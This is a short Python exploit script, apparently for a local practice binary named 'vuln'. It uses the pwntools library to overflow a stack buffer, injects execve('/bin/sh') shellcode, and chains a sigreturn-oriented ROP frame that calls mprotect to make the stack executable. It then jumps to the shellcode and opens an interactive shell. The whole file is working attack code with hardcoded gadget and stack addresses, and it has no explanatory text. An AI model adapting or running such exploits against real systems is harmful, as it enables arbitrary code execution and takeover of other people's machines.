"""
mpretect : 0x7ffff7edac20
0x7ffff7e20660 : exit
"""
import pwn
import struct
pwn.context.arch = "amd64"
pwn.context.log_level = 'debug'
p = pwn.process("./vuln")

def p64(n):
	return struct.pack("Q", n)

shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62"
shellcode += b"\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31"
shellcode += b"\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c"
shellcode += b"\x58\x0f\x05"
#shellcode = b"\xCC"*4

payload = shellcode
payload += b"A"*(64-len(shellcode))
payload += b"B"*(72-64)
payload += p64(0x0000000000401136) # pop rax ; ret
payload += p64(15) # SYS_RT_SIGRETURN
payload += p64(0x0000000000401138) # syscall ; ret

frame = pwn.SigreturnFrame() # crafts a sigreturn frame
frame.rdi = 0x00007ffffffde000 # Stack address
frame.rsi = 9999999999 # size
frame.rdx = 0x7 # All permissions
frame.rip = 0x000000000040113b # RAX => 10
#frame.rip =  # Do the syscall
frame.rsp = 0x7fffffffde80 + len(payload) + 248

payload += bytes(frame)
payload += p64(0x0000000000401138) # syscall
payload += p64(0x7fffffffde80)
file = open("payload", "wb")
file.write(payload)

pwn.pause()

p.sendline(payload)
r = p.recvline()
print(r)
pwn.pause()
p.interactive()